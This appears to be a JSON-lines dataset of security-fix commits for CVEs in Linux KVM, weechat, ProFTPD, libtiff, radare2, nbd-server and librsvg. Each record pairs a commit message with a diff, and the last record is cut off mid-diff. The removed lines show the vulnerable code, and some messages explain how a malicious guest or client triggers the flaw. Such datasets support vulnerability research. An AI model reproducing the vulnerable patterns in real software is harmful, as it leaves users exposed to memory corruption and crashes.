{"CVE_ID": "CVE-2013-1796", "CWE_ID": "119", "category": "security", "commit_id": "c300aa64ddf57d9c5d9c898a64b36877345dd4a9", "commit_message": "From c300aa64ddf57d9c5d9c898a64b36877345dd4a9 Mon Sep 17 00:00:00 2001\nFrom: Andy Honig <ahonig@google.com>\nDate: Mon, 11 Mar 2013 09:34:52 -0700\nSubject: [PATCH] KVM: x86: fix for buffer overflow in handling of\n MSR_KVM_SYSTEM_TIME (CVE-2013-1796)\n\nIf the guest sets the GPA of the time_page so that the request to update the\ntime straddles a page then KVM will write onto an incorrect page.  The\nwrite is done byusing kmap atomic to get a pointer to the page for the time\nstructure and then performing a memcpy to that page starting at an offset\nthat the guest controls.  Well behaved guests always provide a 32-byte aligned\naddress, however a malicious guest could use this to corrupt host kernel\nmemory.\n\nTested: Tested against kvmclock unit test.\n\nSigned-off-by: Andrew Honig <ahonig@google.com>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>\n---\n arch/x86/kvm/x86.c | 5 +++++\n 1 file changed, 5 insertions(+)\n\n", "diff_code": "diff --git a/arch/x86/kvm/x86.c b/arch/x86/kvm/x86.c\nindex f7c850b369101..2ade60c254020 100644\n--- a/arch/x86/kvm/x86.c\n+++ b/arch/x86/kvm/x86.c\n@@ -1959,6 +1959,11 @@ int kvm_set_msr_common(struct kvm_vcpu *vcpu, struct msr_data *msr_info)\n \t\t/* ...but clean it before doing the actual write */\n \t\tvcpu->arch.time_offset = data & ~(PAGE_MASK | 1);\n \n+\t\t/* Check that the address is 32-byte aligned. */\n+\t\tif (vcpu->arch.time_offset &\n+\t\t\t\t(sizeof(struct pvclock_vcpu_time_info) - 1))\n+\t\t\tbreak;\n+\n \t\tvcpu->arch.time_page =\n \t\t\t\tgfn_to_page(vcpu->kvm, data >> PAGE_SHIFT);\n \n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-8073", "CWE_ID": "119", "category": "security", "commit_id": "2fb346f25f79e412cf0ed314fdf791763c19b70b", "commit_message": "From 2fb346f25f79e412cf0ed314fdf791763c19b70b Mon Sep 17 00:00:00 2001\nFrom: Tobias Stoeckmann <tobias@stoeckmann.org>\nDate: Sat, 22 Apr 2017 15:10:53 +0200\nSubject: [PATCH] irc: fix parsing of DCC filename\n\n---\n src/plugins/irc/irc-ctcp.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/src/plugins/irc/irc-ctcp.c b/src/plugins/irc/irc-ctcp.c\nindex e62832bcf..8afee681c 100644\n--- a/src/plugins/irc/irc-ctcp.c\n+++ b/src/plugins/irc/irc-ctcp.c\n@@ -512,7 +512,7 @@ irc_ctcp_dcc_filename_without_quotes (const char *filename)\n     int length;\n \n     length = strlen (filename);\n-    if (length > 0)\n+    if (length > 1)\n     {\n         if ((filename[0] == '\\\"') && (filename[length - 1] == '\\\"'))\n             return weechat_strndup (filename + 1, length - 2);\n", "owner": "weechat", "repo": "weechat", "source": "cve"}
{"CVE_ID": "CVE-2017-7418", "CWE_ID": "59", "category": "security", "commit_id": "349addc3be4fcdad9bd4ec01ad1ccd916c898ed8", "commit_message": "From 349addc3be4fcdad9bd4ec01ad1ccd916c898ed8 Mon Sep 17 00:00:00 2001\nFrom: TJ Saunders <tj@castaglia.org>\nDate: Sun, 5 Mar 2017 16:20:57 -0800\nSubject: [PATCH] Walk the entire DefaultRoot path, checking for symlinks of\n any component, when AllowChrootSymlinks is disabled.\n\n---\n modules/mod_auth.c                            | 73 ++++++++++++++----\n tests/t/lib/ProFTPD/TestSuite/Utils.pm        | 23 +++---\n .../t/lib/ProFTPD/Tests/Config/DefaultRoot.pm | 76 +++++--------------\n 3 files changed, 93 insertions(+), 79 deletions(-)\n\n", "diff_code": "diff --git a/modules/mod_auth.c b/modules/mod_auth.c\nindex 7e9f8da80..6e535bbb7 100644\n--- a/modules/mod_auth.c\n+++ b/modules/mod_auth.c\n@@ -804,6 +804,59 @@ static const char *get_default_chdir(pool *p, xaset_t *conf) {\n   return dir;\n }\n \n+static int is_symlink_path(pool *p, const char *path, size_t pathlen) {\n+  int res, xerrno = 0;\n+  struct stat st;\n+  char *ptr;\n+\n+  if (pathlen == 0) {\n+    return 0;\n+  }\n+\n+  pr_fs_clear_cache2(path);\n+  res = pr_fsio_lstat(path, &st);\n+  if (res < 0) {\n+    xerrno = errno;\n+\n+    pr_log_pri(PR_LOG_WARNING, \"error: unable to check %s: %s\", path,\n+      strerror(xerrno));\n+\n+    errno = xerrno;\n+    return -1;\n+  }\n+\n+  if (S_ISLNK(st.st_mode)) {\n+    errno = EPERM;\n+    return -1;\n+  }\n+\n+  /* To handle the case where a component further up the path might be a\n+   * symlink (which lstat(2) will NOT handle), we walk the path backwards,\n+   * calling ourselves recursively.\n+   */\n+\n+  ptr = strrchr(path, '/');\n+  if (ptr != NULL) {\n+    char *new_path;\n+    size_t new_pathlen;\n+\n+    pr_signals_handle();\n+\n+    new_pathlen = ptr - path;\n+    new_path = pstrndup(p, path, new_pathlen);\n+\n+    pr_log_debug(DEBUG10,\n+      \"AllowChrootSymlink: path '%s' not a symlink, checking '%s'\", path,\n+      new_path);\n+    res = is_symlink_path(p, new_path, new_pathlen);\n+    if (res < 0) {\n+      return -1;\n+    }\n+  }\n+\n+  return 0;\n+}\n+\n /* Determine if the user (non-anon) needs a default root dir other than /. */\n static int get_default_root(pool *p, int allow_symlinks, const char **root) {\n   config_rec *c = NULL;\n@@ -847,7 +900,6 @@ static int get_default_root(pool *p, int allow_symlinks, const char **root) {\n \n       if (allow_symlinks == FALSE) {\n         char *path, target_path[PR_TUNABLE_PATH_MAX + 1];\n-        struct stat st;\n         size_t pathlen;\n \n         /* First, deal with any possible interpolation.  dir_realpath() will\n@@ -878,22 +930,13 @@ static int get_default_root(pool *p, int allow_symlinks, const char **root) {\n           path[pathlen-1] = '\\0';\n         }\n \n-        pr_fs_clear_cache2(path);\n-        res = pr_fsio_lstat(path, &st);\n+        res = is_symlink_path(p, path, pathlen);\n         if (res < 0) {\n-          xerrno = errno;\n-\n-          pr_log_pri(PR_LOG_WARNING, \"error: unable to check %s: %s\", path,\n-            strerror(xerrno));\n-\n-          errno = xerrno;\n-          return -1;\n-        }\n+          if (errno == EPERM) {\n+            pr_log_pri(PR_LOG_WARNING, \"error: DefaultRoot %s is a symlink \"\n+              \"(denied by AllowChrootSymlinks config)\", path);\n+          }\n \n-        if (S_ISLNK(st.st_mode)) {\n-          pr_log_pri(PR_LOG_WARNING,\n-            \"error: DefaultRoot %s is a symlink (denied by AllowChrootSymlinks \"\n-            \"config)\", path);\n           errno = EPERM;\n           return -1;\n         }\ndiff --git a/tests/t/lib/ProFTPD/TestSuite/Utils.pm b/tests/t/lib/ProFTPD/TestSuite/Utils.pm\nindex 0d8b76fab..8872231db 100644\n--- a/tests/t/lib/ProFTPD/TestSuite/Utils.pm\n+++ b/tests/t/lib/ProFTPD/TestSuite/Utils.pm\n@@ -1198,6 +1198,7 @@ sub test_setup {\n   $uid = 500 unless defined($uid);\n   my $gid = shift;\n   $gid = 500 unless defined($gid);\n+  my $home_dir = shift;\n \n   my $config_file = \"$tmpdir/$name.conf\";\n   my $pid_file = File::Spec->rel2abs(\"$tmpdir/$name.pid\");\n@@ -1206,17 +1207,21 @@ sub test_setup {\n   my $auth_user_file = File::Spec->rel2abs(\"$tmpdir/$name.passwd\");\n   my $auth_group_file = File::Spec->rel2abs(\"$tmpdir/$name.group\");\n \n-  my $home_dir = File::Spec->rel2abs($tmpdir);\n+  # If the caller provides the home directory, it is ASSUMED that they will\n+  # have created it.\n+  unless (defined($home_dir)) {\n+    $home_dir = File::Spec->rel2abs($tmpdir);\n \n-  # Make sure that, if we're running as root, that the home directory has\n-  # permissions/privs set for the account we create\n-  if ($< == 0) {\n-    unless (chmod(0755, $home_dir)) {\n-      croak(\"Can't set perms on $home_dir to 0755: $!\");\n-    }\n+    # Make sure that, if we're running as root, that the home directory has\n+    # permissions/privs set for the account we create\n+    if ($< == 0) {\n+      unless (chmod(0755, $home_dir)) {\n+        croak(\"Can't set perms on $home_dir to 0755: $!\");\n+      }\n \n-    unless (chown($uid, $gid, $home_dir)) {\n-      croak(\"Can't set owner of $home_dir to $uid/$gid: $!\");\n+      unless (chown($uid, $gid, $home_dir)) {\n+        croak(\"Can't set owner of $home_dir to $uid/$gid: $!\");\n+      }\n     }\n   }\n \ndiff --git a/tests/t/lib/ProFTPD/Tests/Config/DefaultRoot.pm b/tests/t/lib/ProFTPD/Tests/Config/DefaultRoot.pm\nindex 3863c1441..88486c3a7 100644\n--- a/tests/t/lib/ProFTPD/Tests/Config/DefaultRoot.pm\n+++ b/tests/t/lib/ProFTPD/Tests/Config/DefaultRoot.pm\n@@ -621,65 +621,39 @@ sub defaultroot_allowchrootsymlinks_bug3852 {\n   my $self = shift;\n   my $tmpdir = $self->{tmpdir};\n \n-  my $config_file = \"$tmpdir/config.conf\";\n-  my $pid_file = File::Spec->rel2abs(\"$tmpdir/config.pid\");\n-  my $scoreboard_file = File::Spec->rel2abs(\"$tmpdir/config.scoreboard\");\n-\n-  my $log_file = test_get_logfile();\n-\n-  my $auth_user_file = File::Spec->rel2abs(\"$tmpdir/config.passwd\");\n-  my $auth_group_file = File::Spec->rel2abs(\"$tmpdir/config.group\");\n-\n   my $user = 'proftpd';\n-  my $passwd = 'test';\n-  my $group = 'ftpd';\n   my $home_dir = File::Spec->rel2abs(\"$tmpdir/home.d/symlinks/$user\");\n   my $uid = 500;\n   my $gid = 500;\n \n-  my $intermed_dir = File::Spec->rel2abs(\"$tmpdir/home.d/symlinks\");\n-  mkpath($intermed_dir);\n-\n-  my $symlink_dst = File::Spec->rel2abs(\"$tmpdir/real/$user\");\n-  mkpath($symlink_dst);\n+  my $symlink_dst = File::Spec->rel2abs(\"$tmpdir/real\");\n \n   my $cwd = getcwd();\n \n-  unless (chdir($intermed_dir)) {\n-    die(\"Can't chdir to $intermed_dir: $!\");\n+  unless (chdir($tmpdir)) {\n+    die(\"Can't chdir to $tmpdir: $!\");\n   }\n \n-  unless (symlink(\"../../real/$user\", \"./$user\")) {\n-    die(\"Can't symlink '../../real/$user' to './$user': $!\");\n+  unless (symlink(\"./real\", \"./home.d\")) {\n+    die(\"Can't symlink './real' to './home.d': $!\");\n   }\n \n   unless (chdir($cwd)) {\n     die(\"Can't chdir to $cwd: $!\");\n   }\n \n-  # Make sure that, if we're running as root, that the home directory has\n-  # permissions/privs set for the account we create\n-  if ($< == 0) {\n-    unless (chmod(0755, $symlink_dst)) {\n-      die(\"Can't set perms on $symlink_dst to 0755: $!\");\n-    }\n+  mkpath(File::Spec->rel2abs(\"$tmpdir/real/symlinks/$user\"));\n \n-    unless (chown($uid, $gid, $symlink_dst)) {\n-      die(\"Can't set owner of $symlink_dst to $uid/$gid: $!\");\n-    }\n-  }\n-\n-  auth_user_write($auth_user_file, $user, $passwd, $uid, $gid, $home_dir,\n-    '/bin/bash');\n-  auth_group_write($auth_group_file, $group, $gid, $user);\n+  my $setup = test_setup($tmpdir, 'config', $user, undef, undef, $uid, $gid,\n+    $home_dir);\n \n   my $config = {\n-    PidFile => $pid_file,\n-    ScoreboardFile => $scoreboard_file,\n-    SystemLog => $log_file,\n+    PidFile => $setup->{pid_file},\n+    ScoreboardFile => $setup->{scoreboard_file},\n+    SystemLog => $setup->{log_file},\n \n-    AuthUserFile => $auth_user_file,\n-    AuthGroupFile => $auth_group_file,\n+    AuthUserFile => $setup->{auth_user_file},\n+    AuthGroupFile => $setup->{auth_group_file},\n \n     AllowChrootSymlinks => 'off',\n     DefaultRoot => '~',\n@@ -691,7 +665,8 @@ sub defaultroot_allowchrootsymlinks_bug3852 {\n     },\n   };\n \n-  my ($port, $config_user, $config_group) = config_write($config_file, $config);\n+  my ($port, $config_user, $config_group) = config_write($setup->{config_file},\n+    $config);\n \n   # Open pipes, for use between the parent and child processes.  Specifically,\n   # the child will indicate when it's done with its test by writing a message\n@@ -709,7 +684,7 @@ sub defaultroot_allowchrootsymlinks_bug3852 {\n   if ($pid) {\n     eval {\n       my $client = ProFTPD::TestSuite::FTP->new('127.0.0.1', $port);\n-      eval { $client->login($user, $passwd) };\n+      eval { $client->login($user, $setup->{passwd}) };\n       unless ($@) {\n         die(\"Login succeeded unexpectedly\");\n       }\n@@ -721,13 +696,12 @@ sub defaultroot_allowchrootsymlinks_bug3852 {\n \n       $expected = 530;\n       $self->assert($expected == $resp_code,\n-        test_msg(\"Expected response code $expected, got $resp_code\"));\n+        \"Expected response code $expected, got $resp_code\");\n \n       $expected = \"Login incorrect.\";\n       $self->assert($expected eq $resp_msg,\n-        test_msg(\"Expected response message '$expected', got '$resp_msg'\"));\n+        \"Expected response message '$expected', got '$resp_msg'\");\n     };\n-\n     if ($@) {\n       $ex = $@;\n     }\n@@ -736,7 +710,7 @@ sub defaultroot_allowchrootsymlinks_bug3852 {\n     $wfh->flush();\n \n   } else {\n-    eval { server_wait($config_file, $rfh) };\n+    eval { server_wait($setup->{config_file}, $rfh) };\n     if ($@) {\n       warn($@);\n       exit 1;\n@@ -746,18 +720,10 @@ sub defaultroot_allowchrootsymlinks_bug3852 {\n   }\n \n   # Stop server\n-  server_stop($pid_file);\n-\n+  server_stop($setup->{pid_file});\n   $self->assert_child_ok($pid);\n \n-  if ($ex) {\n-    test_append_logfile($log_file, $ex);\n-    unlink($log_file);\n-\n-    die($ex);\n-  }\n-\n-  unlink($log_file);\n+  test_cleanup($setup->{log_file}, $ex);\n }\n \n 1;\n", "owner": "proftpd", "repo": "proftpd", "source": "cve"}
{"CVE_ID": "CVE-2014-3183", "CWE_ID": "119", "category": "security", "commit_id": "51217e69697fba92a06e07e16f55c9a52d8e8945", "commit_message": "From 51217e69697fba92a06e07e16f55c9a52d8e8945 Mon Sep 17 00:00:00 2001\nFrom: Jiri Kosina <jkosina@suse.cz>\nDate: Thu, 21 Aug 2014 09:56:47 -0500\nSubject: [PATCH] HID: logitech: fix bounds checking on LED report size\n\nThe check on report size for REPORT_TYPE_LEDS in logi_dj_ll_raw_request()\nis wrong; the current check doesn't make any sense -- the report allocated\nby HID core in hid_hw_raw_request() can be much larger than\nDJREPORT_SHORT_LENGTH, and currently logi_dj_ll_raw_request() doesn't\nhandle this properly at all.\n\nFix the check by actually trimming down the report size properly if it is\ntoo large.\n\nCc: stable@vger.kernel.org\nReported-by: Ben Hawkes <hawkes@google.com>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>\n---\n drivers/hid/hid-logitech-dj.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/drivers/hid/hid-logitech-dj.c b/drivers/hid/hid-logitech-dj.c\nindex 486dbde2ba2d9..ca0ab5112efd6 100644\n--- a/drivers/hid/hid-logitech-dj.c\n+++ b/drivers/hid/hid-logitech-dj.c\n@@ -557,7 +557,7 @@ static int logi_dj_ll_raw_request(struct hid_device *hid,\n \tif (!out_buf)\n \t\treturn -ENOMEM;\n \n-\tif (count < DJREPORT_SHORT_LENGTH - 2)\n+\tif (count > DJREPORT_SHORT_LENGTH - 2)\n \t\tcount = DJREPORT_SHORT_LENGTH - 2;\n \n \tout_buf[0] = REPORT_ID_DJ_SHORT;\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-10271", "CWE_ID": "119", "category": "security", "commit_id": "9657bbe3cdce4aaa90e07d50c1c70ae52da0ba6a", "commit_message": "From 9657bbe3cdce4aaa90e07d50c1c70ae52da0ba6a Mon Sep 17 00:00:00 2001\nFrom: erouault <erouault>\nDate: Sat, 3 Dec 2016 11:35:56 +0000\nSubject: [PATCH] * tools/tiffcrop.c: fix readContigStripsIntoBuffer() in -i\n (ignore) mode so that the output buffer is correctly incremented to avoid\n write outside bounds. Reported by Agostino Sarubbo. Fixes\n http://bugzilla.maptools.org/show_bug.cgi?id=2620\n\n---\n ChangeLog        | 7 +++++++\n tools/tiffcrop.c | 2 +-\n 2 files changed, 8 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/ChangeLog b/ChangeLog\nindex 5b23665b..d6a416bd 100644\n--- a/ChangeLog\n+++ b/ChangeLog\n@@ -1,3 +1,10 @@\n+2016-12-03 Even Rouault <even.rouault at spatialys.com>\n+\n+\t* tools/tiffcrop.c: fix readContigStripsIntoBuffer() in -i (ignore) mode so\n+\tthat the output buffer is correctly incremented to avoid write outside bounds.\n+\tReported by Agostino Sarubbo.\n+\tFixes http://bugzilla.maptools.org/show_bug.cgi?id=2620\n+\n 2016-12-03 Even Rouault <even.rouault at spatialys.com>\n \n \t* libtiff/tif_ojpeg.c: make OJPEGDecode() early exit in case of failure in\ndiff --git a/tools/tiffcrop.c b/tools/tiffcrop.c\nindex b87a77a8..70a71e17 100644\n--- a/tools/tiffcrop.c\n+++ b/tools/tiffcrop.c\n@@ -3698,7 +3698,7 @@ static int readContigStripsIntoBuffer (TIFF* in, uint8* buf)\n                                   (unsigned long) strip, (unsigned long)rows);\n                         return 0;\n                 }\n-                bufp += bytes_read;\n+                bufp += stripsize;\n         }\n \n         return 1;\n", "owner": "vadz", "repo": "libtiff", "source": "cve"}
{"CVE_ID": "CVE-2013-6376", "CWE_ID": "189", "category": "security", "commit_id": "17d68b763f09a9ce824ae23eb62c9efc57b69271", "commit_message": "From 17d68b763f09a9ce824ae23eb62c9efc57b69271 Mon Sep 17 00:00:00 2001\nFrom: Gleb Natapov <gleb@redhat.com>\nDate: Thu, 12 Dec 2013 21:20:08 +0100\nSubject: [PATCH] KVM: x86: fix guest-initiated crash with x2apic\n (CVE-2013-6376)\n\nA guest can cause a BUG_ON() leading to a host kernel crash.\nWhen the guest writes to the ICR to request an IPI, while in x2apic\nmode the following things happen, the destination is read from\nICR2, which is a register that the guest can control.\n\nkvm_irq_delivery_to_apic_fast uses the high 16 bits of ICR2 as the\ncluster id.  A BUG_ON is triggered, which is a protection against\naccessing map->logical_map with an out-of-bounds access and manages\nto avoid that anything really unsafe occurs.\n\nThe logic in the code is correct from real HW point of view. The problem\nis that KVM supports only one cluster with ID 0 in clustered mode, but\nthe code that has the bug does not take this into account.\n\nReported-by: Lars Bull <larsbull@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Gleb Natapov <gleb@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch/x86/kvm/lapic.c | 5 ++++-\n 1 file changed, 4 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/arch/x86/kvm/lapic.c b/arch/x86/kvm/lapic.c\nindex b8bec45c1610d..dec48bfaddb8f 100644\n--- a/arch/x86/kvm/lapic.c\n+++ b/arch/x86/kvm/lapic.c\n@@ -143,6 +143,8 @@ static inline int kvm_apic_id(struct kvm_lapic *apic)\n \treturn (kvm_apic_get_reg(apic, APIC_ID) >> 24) & 0xff;\n }\n \n+#define KVM_X2APIC_CID_BITS 0\n+\n static void recalculate_apic_map(struct kvm *kvm)\n {\n \tstruct kvm_apic_map *new, *old = NULL;\n@@ -180,7 +182,8 @@ static void recalculate_apic_map(struct kvm *kvm)\n \t\tif (apic_x2apic_mode(apic)) {\n \t\t\tnew->ldr_bits = 32;\n \t\t\tnew->cid_shift = 16;\n-\t\t\tnew->cid_mask = new->lid_mask = 0xffff;\n+\t\t\tnew->cid_mask = (1 << KVM_X2APIC_CID_BITS) - 1;\n+\t\t\tnew->lid_mask = 0xffff;\n \t\t} else if (kvm_apic_sw_enabled(apic) &&\n \t\t\t\t!new->cid_mask /* flat mode */ &&\n \t\t\t\tkvm_apic_get_reg(apic, APIC_DFR) == APIC_DFR_CLUSTER) {\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-6319", "CWE_ID": "119", "category": "security", "commit_id": "ad55822430a03fe075221b543efb434567e9e431", "commit_message": "From ad55822430a03fe075221b543efb434567e9e431 Mon Sep 17 00:00:00 2001\nFrom: pancake <pancake@nopcode.org>\nDate: Thu, 23 Feb 2017 19:17:28 +0100\nSubject: [PATCH] Fix #6836 - oob write in dex\n\n---\n libr/bin/p/bin_dex.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/libr/bin/p/bin_dex.c b/libr/bin/p/bin_dex.c\nindex 601b28a5d7..9a91dae9c6 100644\n--- a/libr/bin/p/bin_dex.c\n+++ b/libr/bin/p/bin_dex.c\n@@ -309,8 +309,8 @@ static void dex_parse_debug_item(RBinFile *binfile, RBinDexObj *bin,\n \tut64 source_file_idx = c->source_file;\n \tRList *params, *debug_positions, *emitted_debug_locals = NULL; \n \tbool keep = true;\n-\tif (argReg >= regsz) {\n-\t\t//return; // this return breaks tests\n+\tif (argReg > regsz) {\n+\t\treturn; // this return breaks tests\n \t}\n \tp4 = r_uleb128 (p4, p4_end - p4, &line_start);\n \tp4 = r_uleb128 (p4, p4_end - p4, &parameters_size);\n", "owner": "radare", "repo": "radare2", "source": "cve"}
{"CVE_ID": "CVE-2013-7441", "CWE_ID": "399", "category": "security", "commit_id": "741495cb08503fd32a9d22648e63b64390c601f4", "commit_message": "From 741495cb08503fd32a9d22648e63b64390c601f4 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Tuomas=20R=C3=A4s=C3=A4nen?= <tuomasjjrasanen@opinsys.fi>\nDate: Wed, 5 Jun 2013 20:42:31 +0300\nSubject: [PATCH] nbd-server: handle modern-style negotiation in a child\n process\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nPreviously, the modern style negotiation was carried out in the root\nserver (listener) process before forking the actual client handler. This\nmade it possible for a malfunctioning or evil client to terminate the\nroot process simply by querying a non-existent export or aborting in the\nmiddle of the negotation process (caused SIGPIPE in the server).\n\nThis commit moves the negotiation process to the child to keep the root\nprocess up and running no matter what happens during the negotiation.\n\nSee http://sourceforge.net/mailarchive/message.php?msg_id=30410146\n\nSigned-off-by: Tuomas Räsänen <tuomasjjrasanen@tjjr.fi>\n---\n nbd-server.c | 169 +++++++++++++++++++++++++++++++++++++++++++++++----\n 1 file changed, 157 insertions(+), 12 deletions(-)\n\n", "diff_code": "diff --git a/nbd-server.c b/nbd-server.c\nindex 392ed9f3..bfc6790e 100644\n--- a/nbd-server.c\n+++ b/nbd-server.c\n@@ -2198,6 +2198,161 @@ void destroy_pid_t(gpointer data) {\n \tg_free(data);\n }\n \n+static pid_t\n+spawn_child()\n+{\n+        pid_t pid;\n+        sigset_t newset;\n+        sigset_t oldset;\n+\n+        sigemptyset(&newset);\n+        sigaddset(&newset, SIGCHLD);\n+        sigaddset(&newset, SIGTERM);\n+        sigprocmask(SIG_BLOCK, &newset, &oldset);\n+        pid = fork();\n+        if (pid < 0) {\n+                msg(LOG_ERR, \"Could not fork (%s)\", strerror(errno));\n+                goto out;\n+        }\n+        if (pid > 0) { /* Parent */\n+                pid_t *pidp;\n+\n+                pidp = g_malloc(sizeof(pid_t));\n+                *pidp = pid;\n+                g_hash_table_insert(children, pidp, pidp);\n+                goto out;\n+        }\n+        /* Child */\n+        signal(SIGCHLD, SIG_DFL);\n+        signal(SIGTERM, SIG_DFL);\n+        signal(SIGHUP, SIG_DFL);\n+out:\n+        sigprocmask(SIG_SETMASK, &oldset, NULL);\n+        return pid;\n+}\n+\n+static int\n+socket_accept(const int sock)\n+{\n+        struct sockaddr_storage addrin;\n+        socklen_t addrinlen = sizeof(addrin);\n+        int net;\n+\n+        net = accept(sock, (struct sockaddr *) &addrin, &addrinlen);\n+        if (net < 0) {\n+                err_nonfatal(\"Failed to accept socket connection: %m\");\n+        }\n+\n+        return net;\n+}\n+\n+static void\n+handle_modern_connection(GArray *const servers, const int sock)\n+{\n+        int net;\n+        pid_t pid;\n+        CLIENT *client = NULL;\n+        int sock_flags_old;\n+        int sock_flags_new;\n+\n+        net = socket_accept(sock);\n+        if (net < 0)\n+                return;\n+\n+        if (!dontfork) {\n+                pid = spawn_child();\n+                if (pid) {\n+                        if (pid > 0)\n+                                msg(LOG_INFO, \"Spawned a child process\");\n+                        if (pid < 0)\n+                                msg(LOG_ERR, \"Failed to spawn a child process\");\n+                        close(net);\n+                        return;\n+                }\n+                /* Child just continues. */\n+        }\n+\n+        client = negotiate(net, NULL, servers, NEG_INIT | NEG_MODERN);\n+        if (!client) {\n+                msg(LOG_ERR, \"Modern initial negotiation failed\");\n+                goto handler_err;\n+        }\n+\n+        if (client->server->max_connections > 0 &&\n+           g_hash_table_size(children) >= client->server->max_connections) {\n+                msg(LOG_ERR, \"Max connections (%d) reached\",\n+                    client->server->max_connections);\n+                goto handler_err;\n+        }\n+\n+        sock_flags_old = fcntl(net, F_GETFL, 0);\n+        if (sock_flags_old == -1) {\n+                msg(LOG_ERR, \"Failed to get socket flags\");\n+                goto handler_err;\n+        }\n+\n+        sock_flags_new = sock_flags_old & ~O_NONBLOCK;\n+        if (sock_flags_new != sock_flags_old &&\n+            fcntl(net, F_SETFL, sock_flags_new) == -1) {\n+                msg(LOG_ERR, \"Failed to set socket to blocking mode\");\n+                goto handler_err;\n+        }\n+\n+        if (set_peername(net, client)) {\n+                msg(LOG_ERR, \"Failed to set peername\");\n+                goto handler_err;\n+        }\n+\n+        if (!authorized_client(client)) {\n+                msg(LOG_INFO, \"Client '%s' is not authorized to access\",\n+                    client->clientname);\n+                goto handler_err;\n+        }\n+\n+        if (!dontfork) {\n+                int i;\n+\n+                /* Free all root server resources here, because we are\n+                 * currently in the child process serving one specific\n+                 * connection. These are not simply needed anymore. */\n+                g_hash_table_destroy(children);\n+                children = NULL;\n+                for (i = 0; i < modernsocks->len; i++) {\n+                        close(g_array_index(modernsocks, int, i));\n+                }\n+                g_array_free(modernsocks, TRUE);\n+\n+                /* Now that we are in the child process after a\n+                 * succesful negotiation, we do not need the list of\n+                 * servers anymore, get rid of it.*/\n+\n+                for (i = 0; i < servers->len; i++) {\n+                        const SERVER *const server = &g_array_index(servers, SERVER, i);\n+                        close(server->socket);\n+                }\n+\n+                /* FALSE does not free the\n+                   actual data. This is required,\n+                   because the client has a\n+                   direct reference into that\n+                   data, and otherwise we get a\n+                   segfault... */\n+                g_array_free(servers, FALSE);\n+        }\n+\n+        msg(LOG_INFO, \"Starting to serve\");\n+        serveconnection(client);\n+        exit(EXIT_SUCCESS);\n+\n+handler_err:\n+        g_free(client);\n+        close(net);\n+\n+        if (!dontfork) {\n+                exit(EXIT_FAILURE);\n+        }\n+}\n+\n static void\n handle_connection(GArray *servers, int net, SERVER *serve, CLIENT *client)\n {\n@@ -2425,7 +2580,6 @@ void serveloop(GArray* servers) {\n \n \t\tmemcpy(&rset, &mset, sizeof(fd_set));\n \t\tif(select(max+1, &rset, NULL, NULL, NULL)>0) {\n-\t\t\tint net;\n \n \t\t\tDEBUG(\"accept, \");\n \t\t\tfor(i=0; i < modernsocks->len; i++) {\n@@ -2433,20 +2587,11 @@ void serveloop(GArray* servers) {\n \t\t\t\tif(!FD_ISSET(sock, &rset)) {\n \t\t\t\t\tcontinue;\n \t\t\t\t}\n-\t\t\t\tCLIENT *client;\n \n-\t\t\t\tif((net=accept(sock, (struct sockaddr *) &addrin, &addrinlen)) < 0) {\n-\t\t\t\t\terr_nonfatal(\"accept: %m\");\n-\t\t\t\t\tcontinue;\n-\t\t\t\t}\n-\t\t\t\tclient = negotiate(net, NULL, servers, NEG_INIT | NEG_MODERN);\n-\t\t\t\tif(!client) {\n-\t\t\t\t\tclose(net);\n-\t\t\t\t\tcontinue;\n-\t\t\t\t}\n-\t\t\t\thandle_connection(servers, net, client->server, client);\n+\t\t\t\thandle_modern_connection(servers, sock);\n \t\t\t}\n \t\t\tfor(i=0; i < servers->len; i++) {\n+\t\t\t\tint net;\n \t\t\t\tSERVER *serve;\n \n \t\t\t\tserve=&(g_array_index(servers, SERVER, i));\n", "owner": "yoe", "repo": "nbd", "source": "cve"}
{"CVE_ID": "CVE-2017-11464", "CWE_ID": "369", "category": "security", "commit_id": "ecf9267a24b2c3c0cd211dbdfa9ef2232511972a", "commit_message": "From ecf9267a24b2c3c0cd211dbdfa9ef2232511972a Mon Sep 17 00:00:00 2001\nFrom: Federico Mena Quintero <federico@gnome.org>\nDate: Tue, 27 Jun 2017 17:12:51 -0500\nSubject: [PATCH] bgo#783835 - Don't divide by zero in box_blur_line() for\n gaussian blurs\n\nWe were making the decision to use box blurs, instead of a true\nGaussian kernel, based on the size of *both* x and y dimensions.  Do\nthem individually instead.\n---\n rsvg-filter.c | 29 ++++++++++++++++++++---------\n 1 file changed, 20 insertions(+), 9 deletions(-)\n\n", "diff_code": "diff --git a/rsvg-filter.c b/rsvg-filter.c\nindex 8e612263..804d6375 100644\n--- a/rsvg-filter.c\n+++ b/rsvg-filter.c\n@@ -1417,6 +1417,8 @@ box_blur_line (gint box_width, gint even_offset,\n                       kernel; it's the pixel to remove from the accumulator. */\n     gint  *ac;     /* Accumulator for each channel                           */\n \n+    g_assert (box_width > 0);\n+\n     ac = g_new0 (gint, bpp);\n \n     /* The algorithm differs for even and odd-sized kernels.\n@@ -1774,7 +1776,6 @@ gaussian_blur_surface (cairo_surface_t *in,\n                        gdouble sx,\n                        gdouble sy)\n {\n-    gboolean use_box_blur;\n     gint width, height;\n     cairo_format_t in_format, out_format;\n     gint in_stride;\n@@ -1818,14 +1819,6 @@ gaussian_blur_surface (cairo_surface_t *in,\n     if (sy < 0.0)\n         sy = 0.0;\n \n-    /* For small radiuses, use a true gaussian kernel; otherwise use three box blurs with\n-     * clever offsets.\n-     */\n-    if (sx < 10.0 && sy < 10.0)\n-        